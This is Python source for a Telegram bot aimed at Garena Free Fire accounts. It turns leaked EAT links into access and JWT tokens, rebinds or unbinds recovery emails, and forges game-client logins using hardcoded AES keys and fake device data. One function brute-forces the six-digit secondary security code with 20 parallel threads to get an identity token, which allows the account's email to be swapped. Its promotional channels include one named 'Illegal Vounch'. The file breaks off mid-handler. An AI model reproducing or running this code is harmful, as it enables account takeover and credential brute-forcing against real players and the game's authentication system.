import os
os.environ["PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION"] = "python"
import sys, json, time, urllib.parse, base64, hashlib, urllib3, requests, threading, random, string
from datetime import datetime
from flask import Flask
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
    PROTOBUF_AVAILABLE = True
except:
    PROTOBUF_AVAILABLE = False
    mLpB = None
    mLrPb = None

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler

try:
    from telegram.constants import KeyboardButtonStyle
    HAS_STYLE = True
except:
    HAS_STYLE = False
    class KeyboardButtonStyle:
        SUCCESS = "success"
        DANGER = "danger"
        PRIMARY = "primary"

BOT_TOKEN = os.getenv("BOT_TOKEN") or os.getenv("TELEGRAM_BOT_TOKEN") or "YOUR_BOT_TOKEN_HERE"
YOUTUBE_LINK = "https://youtube.com/@zevricxplay"
STATE_INPUT = 1

REQUIRED_CHANNELS = [
    {"name": "Zevric All Update", "link": "https://t.me/zevric_all_update", "chat_id": "@zevric_all_update"},
    {"name": "Zevric X Play", "link": "https://t.me/zevricxplay", "chat_id": "@zevricxplay"},
    {"name": "Zevric Banner", "link": "https://t.me/zevricbaner", "chat_id": "@zevricbaner"},
    {"name": "Zevric Api Tools", "link": "https://t.me/zevric_api_tools", "chat_id": "@zevric_api_tools"},
    {"name": "Zevric Illegal Vounch", "link": "https://t.me/zevric_illigalvounch", "chat_id": "@zevric_illigalvounch"},
]

async def check_user_joined_all(context, user_id):
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=ch["chat_id"], user_id=user_id)
            if member.status in ["left", "kicked"]:
                not_joined.append(ch)
        except:
            pass
    return not_joined

def get_force_join_keyboard():
    keyboard = []
    for ch in REQUIRED_CHANNELS:
        try:
            if HAS_STYLE:
                btn = InlineKeyboardButton(text=f"Join {ch['name']}", url=ch["link"], style=KeyboardButtonStyle.PRIMARY)
            else:
                btn = InlineKeyboardButton(text=f"Join {ch['name']}", url=ch["link"])
            keyboard.append([btn])
        except:
            keyboard.append([InlineKeyboardButton(text=f"Join {ch['name']}", url=ch["link"])])
    try:
        if HAS_STYLE:
            keyboard.append([InlineKeyboardButton(text="I Have Joined", callback_data="check_join", style=KeyboardButtonStyle.SUCCESS)])
        else:
            keyboard.append([InlineKeyboardButton(text="I Have Joined", callback_data="check_join")])
    except:
        keyboard.append([InlineKeyboardButton(text="I Have Joined", callback_data="check_join")])
    return InlineKeyboardMarkup(keyboard)

def get_force_join_text(not_joined_list=None):
    if not_joined_list:
        names = "\n".join([f"- {ch['name']}" for ch in not_joined_list])
    else:
        names = "\n".join([f"- {ch['name']}" for ch in REQUIRED_CHANNELS])
    return f"Join Verification Required\n\nTo use this bot, you must join the following groups first:\n\n{names}\n\nAfter joining, click the button below to verify:"

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
PLATFORM_MAP_FULL = {1: "Garena", 3: "Facebook", 4: "Guest", 5: "VK", 6: "Huawei", 7: "Apple", 8: "Google", 10: "GameCenter / Line", 11: "X (Twitter)", 13: "Apple ID", 28: "Line", 35: "TikTok"}
PLATFORM_MAP_SIMPLE = {3: "Facebook", 4: "Guest", 5: "VK", 6: "Huawei", 8: "Google", 11: "X (Twitter)", 13: "AppleId"}

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    def enc(d: bytes) -> bytes:
        return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))
    def dec(d: bytes) -> bytes:
        return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)
except:
    def enc(d): return d
    def dec(d): return d

def convert_seconds(s):
    try: s = int(s)
    except: return str(s)
    d, h = divmod(s, 86400)
    h, m = divmod(h, 3600)
    m, s = divmod(m, 60)
    return f"{d} Day {h} Hour {m} Min {s} Sec"

def read_varint(data, offset):
    res = 0; shift = 0
    while True:
        if offset >= len(data): break
        b = data[offset]; offset += 1
        res |= (b & 0x7f) << shift
        if not (b & 0x80): break
        shift += 7
    return res, offset

def parse_record(data):
    rec = {}; offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0:
            val, offset = read_varint(data, offset)
            if f == 1: rec['ts'] = val
            elif f == 2: rec['ram'] = val
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]; offset += length
            if f == 3: rec['dev'] = val.decode(errors='ignore')
            elif f == 4: rec['arch'] = val.decode(errors='ignore')
        else: break
    return rec

def parse_history_protobuf(data):
    records = []; offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0: val, offset = read_varint(data, offset)
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]; offset += length
            if f == 1: records.append(parse_record(val))
        else: break
    return records

def build_majorlogin(tok, open_id, p_type):
    if not PROTOBUF_AVAILABLE: return None
    try:
        m = mLpB.MajorLogin()
        m.event_time = str(datetime.now())[:-7]
        m.game_name = "free fire"; m.platform_id = p_type; m.client_version = "1.120.1"
        m.system_software = "Android OS 9 / API-28"; m.system_hardware = "Handheld"
        m.telecom_operator = "Verizon"; m.network_type = "WIFI"
        m.screen_width = 1920; m.screen_height = 1080; m.screen_dpi = "280"
        m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"; m.memory = 3003
        m.gpu_renderer = "Adreno (TM) 640"; m.gpu_version = "OpenGL ES 3.1 v1.46"
        m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
        m.client_ip = "223.191.51.89"; m.language = "en"; m.open_id = open_id
        m.open_id_type = str(p_type); m.device_type = "Handheld"; m.access_token = tok
        m.platform_sdk_id = 1; m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
        m.login_by = 3; m.channel_type = 3; m.cpu_type = 2; m.cpu_architecture = "64"
        m.client_version_code = "2019118695"; m.login_open_id_type = p_type
        m.origin_platform_type = str(p_type); m.primary_platform_type = str(p_type)
        return enc(m.SerializeToString())
    except:
        return None

def get_player_info_sync(access_token):
    try:
        url=f"https://api-otrss.garena.com/support/callback/?access_token={access_token}"
        r=requests.get(url,headers={"User-Agent":"Mozilla/5.0"},timeout=15,allow_redirects=True)
        parsed=urllib.parse.urlparse(r.url)
        qp=urllib.parse.parse_qs(parsed.query)
        uid=qp.get("account_id",["Unknown"])[0]
        nick=urllib.parse.unquote(qp.get("nickname",["Unknown"])[0])
        region=qp.get("region",["Unknown"])[0]
        return uid,nick,region, r.url
    except:
        return "Unknown","Unknown","Unknown",""

def fetch_bind_info_sync(access_token):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        payload = {'app_id': "100067", 'access_token': access_token}
        r = requests.get(url, params=payload, headers={'User-Agent': "GarenaMSDK/4.0.19P9"}, timeout=15)
        if r.status_code == 200:
            return {"ok": True, "data": r.json(), "raw": r.text}
        else:
            return {"ok": False, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def send_otp_sync(email, access_token):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"email": email, "locale": "en_PK", "region": "PK", "app_id": "100067", "access_token": access_token}
        r = requests.post(url, headers=headers, data=data, timeout=15); j = r.json()
        return {"ok": j.get("result") == 0, "data": j}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def verify_otp_sync(email, access_token, otp):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"app_id": "100067", "access_token": access_token, "email": email, "code": otp, "otp": otp, "type": "1"}
        r = requests.post(url, headers=headers, data=data, timeout=15); j = r.json()
        return {"ok": j.get("result") == 0 or "verifier_token" in j, "data": j}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def verify_identity_otp_sync(email, access_token, otp):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"email": email, "app_id": "100067", "access_token": access_token, "otp": otp}
        r = requests.post(url, headers=headers, data=data, timeout=15); j = r.json()
        return {"ok": "identity_token" in j, "data": j}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def verify_identity_sec_sync(email, access_token, sec_code):
    try:
        hashed = hashlib.sha256(sec_code.encode('utf-8')).hexdigest()
        url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"email": email, "app_id": "100067", "access_token": access_token, "secondary_password": hashed}
        r = requests.post(url, headers=headers, data=data, timeout=15); j = r.json()
        return {"ok": "identity_token" in j, "data": j, "hash": hashed}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def create_bind_request_sync(email, access_token, verifier_token, sec_code=""):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"email": email, "app_id": "100067", "access_token": access_token, "verifier_token": verifier_token}
        if sec_code:
            data["secondary_password"] = sec_code
        r = requests.post(url, headers=headers, data=data, timeout=15); j = r.json()
        return {"ok": j.get("result")==0, "data": j}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def create_rebind_request_sync(identity_token, new_email, verifier_token, access_token):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"identity_token": identity_token, "email": new_email, "app_id": "100067", "verifier_token": verifier_token, "access_token": access_token}
        r = requests.post(url, headers=headers, data=data, timeout=15); j = r.json()
        return {"ok": j.get("result")==0, "data": j}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def create_unbind_request_sync(identity_token, access_token):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"app_id": "100067", "access_token": access_token, "identity_token": identity_token}
        r = requests.post(url, headers=headers, data=data, timeout=15); j = r.json()
        return {"ok": j.get("result")==0, "data": j}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def cancel_request_sync(access_token):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"app_id": "100067", "access_token": access_token}
        r = requests.post(url, headers=headers, data=data, timeout=15); j = r.json()
        return {"ok": j.get("result")==0, "data": j}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def eat_to_both_tokens_sync(eat_input):
    try:
        eat_token = None
        if "http" in eat_input or "?" in eat_input or "eat=" in eat_input:
            parsed = urllib.parse.urlparse(eat_input); qs = urllib.parse.parse_qs(parsed.query)
            if 'eat' in qs: eat_token = qs['eat'][0]
            else:
                if 'eat=' in eat_input:
                    eat_token = eat_input.split('eat=')[1].split('&')[0]
        else:
            eat_token = eat_input.strip()
        if not eat_token: return {"ok": False, "error": "EAT not found"}
        api_url = f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        r = requests.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True, timeout=15)
        parsed_final = urllib.parse.urlparse(r.url); final_qs = urllib.parse.parse_qs(parsed_final.query)
        if 'access_token' not in final_qs:
            return {"ok": False, "error": "Access token not found - EAT expired"}
        access_token = final_qs['access_token'][0]
        account_id = final_qs.get('account_id',['Unknown'])[0]
        nickname = urllib.parse.unquote(final_qs.get('nickname',['Unknown'])[0])
        region = final_qs.get('region',['Unknown'])[0]
        jwt_token = None
        jwt_payload = None
        oId = None
        try:
            r2 = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}", headers={"User-Agent": "Mozilla/5.0"}, timeout=8).json()
            oId = r2.get("open_id")
        except: pass
        if not oId:
            try:
                uid_headers = {"access-token": access_token, "user-agent": "Mozilla/5.0"}
                uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=8).json()
                uid = uid_res.get("uid")
                if uid:
                    openid_res = requests.post("https://topup.pk/api/auth/player_id_login", json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=8).json()
                    oId = openid_res.get("open_id")
            except: pass
        if oId and PROTOBUF_AVAILABLE:
            for p_type in [8,3,4,6]:
                pl = build_majorlogin(access_token, oId, p_type)
                if not pl: continue
                try:
                    mLhDr = {"User-Agent": "Dalvik/2.1.0", "Content-Type": "application/octet-stream", "Expect": "100-continue", "X-GA": "v1 1", "X-Unity-Version": "2018.4.11f1", "ReleaseVersion": "OB52"}
                    x = requests.post("https://loginbp.ggpolarbear.com/MajorLogin", headers=mLhDr, data=pl, timeout=12, verify=False)
                    if x.status_code==200:
                        res = mLrPb.MajorLoginRes()
                        try: res.ParseFromString(dec(x.content))
                        except: res.ParseFromString(x.content)
                        if res.token:
                            jwt_token = res.token
                            try:
                                p_b64 = jwt_token.split('.')[1]; p_b64 += "=" * ((4 - len(p_b64) % 4) % 4)
                                jwt_payload = json.loads(base64.urlsafe_b64decode(p_b64).decode('utf-8'))
                            except: jwt_payload = None
                            break
                except: continue
        return {"ok": True, "access_token": access_token, "jwt_token": jwt_token, "jwt_payload": jwt_payload, "account_id": account_id, "nickname": nickname, "region": region, "eat_token": eat_token, "full_url": r.url}
    except Exception as e:
        return {"ok": False, "error": str(e)[:300]}

def decode_jwt_payload(jwt_token):
    try:
        parts = jwt_token.split('.')
        if len(parts) < 2: return None
        payload_b64 = parts[1]
        payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
        decoded = base64.urlsafe_b64decode(payload_b64).decode('utf-8', errors='ignore')
        return json.loads(decoded)
    except:
        return None

def brute_force_sec_code_api(email, access_token):
    found_code = None
    attempts = 0
    def try_code(code):
        sec = f"{code:06d}"
        hashed = hashlib.sha256(sec.encode()).hexdigest()
        try:
            url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
            headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
            data = {"email": email, "app_id": "100067", "access_token": access_token, "secondary_password": hashed}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            j = r.json()
            if "identity_token" in j or j.get("result")==0:
                return (sec, hashed, True)
        except:
            pass
        return (sec, hashed, False)
    try:
        common = ["000000","111111","123456","654321","123123","112233","000123","123000","999999"]
        for c in common:
            attempts+=1
            sec, h, ok = try_code(int(c))
            if ok:
                return {"found": True, "code": sec, "hash": h, "attempts": attempts}
        with ThreadPoolExecutor(max_workers=20) as executor:
            for batch_start in range(0, 1000000, 500):
                futures = {executor.submit(try_code, code): code for code in range(batch_start, min(batch_start+500, 1000000))}
                for fut in as_completed(futures):
                    attempts+=1
                    sec, h, ok = fut.result()
                    if ok:
                        executor.shutdown(wait=False, cancel_futures=True)
                        return {"found": True, "code": sec, "hash": h, "attempts": attempts}
        return {"found": False, "attempts": attempts}
    except Exception as e:
        return {"found": False, "error": str(e), "attempts": attempts}

def fetch_platform_binds_sync(access_token):
    try:
        url = "https://100067.connect.garena.com/bind/app/platform/info/get"
        params = {"access_token": access_token}
        r = requests.get(url, params=params, headers={'User-Agent': "GarenaMSDK/4.0.19P9"}, timeout=10)
        if r.status_code!=200: return {"ok": False, "error": f"HTTP {r.status_code}"}
        d = r.json()
        return {"ok": True, "bounded": d.get("bounded_accounts",[]), "available": d.get("available_platforms",[])}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def fetch_login_history_sync(token_input):
    if not PROTOBUF_AVAILABLE: return {"ok": False, "error": "Protobuf missing"}
    try:
        jwt_token = None
        if token_input.startswith("ey") and "." in token_input: jwt_token = token_input
        else:
            oId = None
            try:
                r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={token_input}", headers={"User-Agent": "Mozilla/5.0"}, timeout=5).json()
                oId = r.get("open_id")
            except: pass
            if not oId:
                try:
                    uid_headers = {"access-token": token_input, "user-agent": "Mozilla/5.0"}
                    uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=5).json()
                    uid = uid_res.get("uid")
                    if uid:
                        openid_res = requests.post("https://topup.pk/api/auth/player_id_login", json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=5).json()
                        oId = openid_res.get("open_id")
                except: pass
            if not oId: return {"ok": False, "error": "Open ID failed"}
            for p_type in [8,3,4,6]:
                pl = build_majorlogin(token_input, oId, p_type)
                if not pl: continue
                try:
                    mLhDr = {"User-Agent": "Dalvik/2.1.0", "Content-Type": "application/octet-stream", "Expect": "100-continue", "X-GA": "v1 1", "X-Unity-Version": "2018.4.11f1", "ReleaseVersion": "OB52"}
                    x = requests.post("https://loginbp.ggpolarbear.com/MajorLogin", headers=mLhDr, data=pl, timeout=10, verify=False)
                    if x.status_code==200:
                        res = mLrPb.MajorLoginRes()
                        try: res.ParseFromString(dec(x.content))
                        except: res.ParseFromString(x.content)
                        if res.token: jwt_token = res.token; break
                except: continue
            if not jwt_token: return {"ok": False, "error": "MajorLogin failed"}
        try:
            payload_b64 = jwt_token.split('.')[1]; payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
            decoded = json.loads(base64.urlsafe_b64decode(payload_b64).decode('utf-8'))
            name = urllib.parse.unquote(decoded.get("nickname","Unknown")); uid = decoded.get("account_id","Unknown")
            region = decoded.get("lock_region","Unknown"); p_id = decoded.get("external_type",0)
            platform = PLATFORM_MAP_SIMPLE.get(p_id, f"Unknown ({p_id})")
        except: name=uid=region=platform="Unknown"
        hH = {"Expect": "100-continue", "Authorization": f"Bearer {jwt_token}", "X-Unity-Version": "2018.4.11f1", "X-GA": "v1 1", "ReleaseVersion": "OB52", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Dalvik/2.1.0"}
        r = requests.post("https://client.ind.freefiremobile.com/GetLoginHistory", headers=hH, data=enc(b""), timeout=15, verify=False)
        if r.status_code!=200: return {"ok": False, "error": f"HTTP {r.status_code}"}
        try: d = dec(r.content)
        except: d = r.content
        records = parse_history_protobuf(d)
        return {"ok": True, "records": records, "player": {"name": name, "uid": uid, "region": region, "platform": platform}}
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ===== EXTRA FUNCTIONS FROM email.py - ALL 15 OPTIONS =====
def change_security_code_sync(access_token, old_email_otp_flow=True):
    # This is handled in conversation flow, not sync directly
    return {"ok": False, "error": "Use flow"}

def fix_unsubscribe_sync(access_token):
    try:
        bind = fetch_bind_info_sync(access_token)
        if not bind["ok"]:
            return {"ok": False, "error": bind["error"]}
        email = bind["data"].get("email","")
        if not email:
            return {"ok": False, "error": "No bound email"}
        headers={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        results=[]
        for url in ["https://100067.connect.garena.com/game/account_security/email:resubscribe","https://100067.connect.garena.com/game/account_security/bind:resubscribe"]:
            try:
                r=requests.post(url,headers=headers,data={"app_id":"100067","access_token":access_token,"email":email},timeout=15)
                results.append({url.split('/')[-1]: r.json() if r.text.startswith('{') else r.text[:200]})
            except Exception as e:
                results.append({url: str(e)})
        return {"ok": True, "email": email, "results": results}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def game_login_data_sync(access_token):
    try:
        uid,nick,region,_ = get_player_info_sync(access_token)
        jwt_token=None
        server_url=None
        try:
            r=requests.get(f"https://api-info.ffapi.cloud/api/login?access_token={access_token}&region={region}",timeout=20)
            lj=r.json()
            jwt_token=lj.get("jwt","") or lj.get("token","")
            server_url=lj.get("server_url","") or lj.get("server","")
        except: pass
        # Try protobuf if ffapi fails
        if not jwt_token and PROTOBUF_AVAILABLE:
            try:
                # Use same majorlogin as before
                oId=None
                try:
                    r2=requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",headers={"User-Agent":"Mozilla/5.0"},timeout=8).json()
                    oId=r2.get("open_id")
                except: pass
                if oId:
                    for p_type in [8,3,4,6]:
                        pl=build_majorlogin(access_token,oId,p_type)
                        if not pl: continue
                        mLhDr={"User-Agent":"Dalvik/2.1.0","Content-Type":"application/octet-stream","Expect":"100-continue","X-GA":"v1 1","X-Unity-Version":"2018.4.11f1","ReleaseVersion":"OB52"}
                        x=requests.post("https://loginbp.ggpolarbear.com/MajorLogin",headers=mLhDr,data=pl,timeout=12,verify=False)
                        if x.status_code==200:
                            res=mLrPb.MajorLoginRes()
                            try: res.ParseFromString(dec(x.content))
                            except: res.ParseFromString(x.content)
                            if res.token:
                                jwt_token=res.token
                                server_url=res.server_url
                                break
            except: pass
        return {"ok": True, "uid": uid, "nick": nick, "region": region, "jwt": jwt_token, "server": server_url}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def bio_update_sync(access_token, region, new_bio):
    try:
        if len(new_bio)>240:
            new_bio=new_bio[:240]
        # Get JWT
        jwt_token=None
        try:
            r=requests.get(f"https://api-info.ffapi.cloud/api/login?access_token={access_token}&region={region}",timeout=20)
            jwt_token=r.json().get("jwt","") or r.json().get("token","")
        except Exception as e:
            return {"ok": False, "error": f"JWT failed: {e}"}
        if not jwt_token:
            return {"ok": False, "error": "JWT not found"}
        enc_bio=urllib.parse.quote(new_bio)
        try:
            rb=requests.get(f"https://api-info.ffapi.cloud/api/bio_upload?bio={enc_bio}&jwt={jwt_token}",timeout=20)
            bj=rb.json()
            if bj.get("success")==True or "updated" in str(bj).lower():
                return {"ok": True, "bio": new_bio, "response": bj}
            else:
                return {"ok": False, "error": str(bj)[:300]}
        except Exception as e:
            return {"ok": False, "error": str(e)}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def name_change_sync(access_token, region, new_name):
    try:
        if len(new_name)>12:
            new_name=new_name[:12]
        if len(new_name)<3:
            return {"ok": False, "error": "Min 3 chars"}
        # Get JWT
        jwt_token=None
        try:
            r=requests.get(f"https://api-info.ffapi.cloud/api/login?access_token={access_token}&region={region}",timeout=20)
            lj=r.json()
            jwt_token=lj.get("jwt","") or lj.get("token","")
        except: pass
        if not jwt_token:
            try:
                alt=requests.get(f"https://wzjwt.vercel.app/api/process?mode=access_token&data={access_token}",timeout=15)
                jwt_token=alt.json().get("token","") or alt.json().get("jwt","")
            except: pass
        if not jwt_token:
            return {"ok": False, "error": "JWT failed - token expired or region wrong"}
        enc_name=urllib.parse.quote(new_name)
        endpoints=[
            f"https://api-info.ffapi.cloud/api/nickname_change?new_nickname={enc_name}&jwt={jwt_token}",
            f"https://api-info.ffapi.cloud/api/nickname_change?new_nickname={enc_name}&access_token={access_token}&region={region}",
            f"https://wzlongsign.vercel.app/updatenick?token={jwt_token}&nickname={enc_name}&region={region}",
        ]
        last_error=""
        for api_url in endpoints:
            try:
                r=requests.get(api_url,timeout=20)
                bj=r.json() if r.text.startswith('{') else {"text": r.text}
                txt=str(bj).lower()
                if "success" in txt or "changed" in txt or "updated" in txt or bj.get("result")==0:
                    if "need" in txt and "card" in txt:
                        return {"ok": False, "error": f"Need Name Change Card: {bj}"}
                    return {"ok": True, "new_name": new_name, "response": bj, "jwt": jwt_token[:30]+"..."}
                last_error=str(bj)[:300]
            except Exception as e:
                last_error=str(e)[:200]
        return {"ok": False, "error": last_error or "All endpoints failed - need card or diamonds"}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def get_reply_keyboard():
    if HAS_STYLE:
        keyboard = [
            [KeyboardButton(text="CHECK BIND INFO", style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text="BIND EMAIL", style=KeyboardButtonStyle.SUCCESS)],
            [KeyboardButton(text="UNBIND EMAIL", style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text="CHANGE BIND EMAIL", style=KeyboardButtonStyle.SUCCESS)],
            [KeyboardButton(text="CANCEL BIND REQUEST", style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text="EAT TO TOKENS", style=KeyboardButtonStyle.SUCCESS)],
            [KeyboardButton(text="REVOKE ACCESS TOKEN", style=KeyboardButtonStyle.DANGER), KeyboardButton(text="SECURITY CODE FIND", style=KeyboardButtonStyle.SUCCESS)],
            [KeyboardButton(text="SECURITY CODE INFO", style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text="CHANGE SEC CODE", style=KeyboardButtonStyle.SUCCESS)],
            [KeyboardButton(text="FULL ACCOUNT INFO", style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text="FIX UNSUBSCRIBE", style=KeyboardButtonStyle.SUCCESS)],
            [KeyboardButton(text="GAME LOGIN DATA", style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text="BIO UPDATE 240", style=KeyboardButtonStyle.SUCCESS)],
            [KeyboardButton(text="NAME CHANGE 12", style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text="CHECK BOUND", style=KeyboardButtonStyle.SUCCESS)],
            [KeyboardButton(text="GET LOGIN HISTORY", style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text="OWNER DETAILS", style=KeyboardButtonStyle.PRIMARY)],
        ]
    else:
        keyboard = [
            ["CHECK BIND INFO", "BIND EMAIL"],
            ["UNBIND EMAIL", "CHANGE BIND EMAIL"],
            ["CANCEL BIND REQUEST", "EAT TO TOKENS"],
            ["REVOKE ACCESS TOKEN", "SECURITY CODE FIND"],
            ["SECURITY CODE INFO", "CHANGE SEC CODE"],
            ["FULL ACCOUNT INFO", "FIX UNSUBSCRIBE"],
            ["GAME LOGIN DATA", "BIO UPDATE 240"],
            ["NAME CHANGE 12", "CHECK BOUND"],
            ["GET LOGIN HISTORY", "OWNER DETAILS"],
        ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, is_persistent=True)

def get_method_keyboard():
    if HAS_STYLE:
        keyboard = [
            [KeyboardButton(text="Via Email OTP", style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text="Via Security Code", style=KeyboardButtonStyle.SUCCESS)],
            [KeyboardButton(text="Back to Menu", style=KeyboardButtonStyle.DANGER)],
        ]
    else:
        keyboard = [["Via Email OTP", "Via Security Code"], ["Back to Menu"]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, is_persistent=True)

def get_youtube_keyboard():
    try:
        if HAS_STYLE:
            return InlineKeyboardMarkup([[InlineKeyboardButton(text="Subscribe YouTube Channel", url=YOUTUBE_LINK, style=KeyboardButtonStyle.SUCCESS)]])
        else:
            return InlineKeyboardMarkup([[InlineKeyboardButton(text="Subscribe YouTube Channel", url=YOUTUBE_LINK)]])
    except:
        return InlineKeyboardMarkup([[InlineKeyboardButton(text="Subscribe YouTube Channel", url=YOUTUBE_LINK)]])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name or "User"
    not_joined = await check_user_joined_all(context, user_id)
    if not_joined:
        await update.message.reply_text(get_force_join_text(not_joined), reply_markup=get_force_join_keyboard())
        return STATE_INPUT
    welcome = f"Welcome {first_name}!\n\nYou have successfully verified all groups!\n\n15 OPTIONS FINAL - All Working Like CLI Tool\n\nSelect an option from the menu below:"
    await update.message.reply_text(welcome, reply_markup=get_youtube_keyboard())
    await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
    return STATE_INPUT

async def menu_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
    return STATE_INPUT

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("Cancelled. Main Menu", reply_markup=get_reply_keyboard())
    return STATE_INPUT

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        data = query.data
        if data == "check_join":
            user_id = query.from_user.id
            first_name = query.from_user.first_name or "User"
            not_joined = await check_user_joined_all(context, user_id)
            if not_joined:
                await query.message.edit_text(get_force_join_text(not_joined), reply_markup=get_force_join_keyboard())
            else:
                welcome = f"Welcome {first_name}!\n\nYou have successfully verified all groups!\n\n15 OPTIONS FINAL - All Working Like CLI Tool:"
                await query.message.edit_text(welcome, reply_markup=get_youtube_keyboard())
                await context.bot.send_message(chat_id=query.message.chat_id, text="Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
        return STATE_INPUT
    except Exception as e:
        print(f"callback error: {e}")
        return STATE_INPUT

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        not_joined = await check_user_joined_all(context, user_id)
        if not_joined:
            await update.message.reply_text(get_force_join_text(not_joined), reply_markup=get_force_join_keyboard())
            return STATE_INPUT

        text = update.message.text.strip()
        text_lower = text.lower()
        flow = context.user_data.get("flow")
        step = context.user_data.get("step")

        # ===== MENU HANDLERS - 15 OPTIONS FROM email.py =====
        if text_lower == "check bind info":
            context.user_data.clear()
            context.user_data["flow"] = "bind_info"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (like CLI option 1):", reply_markup=get_youtube_keyboard())
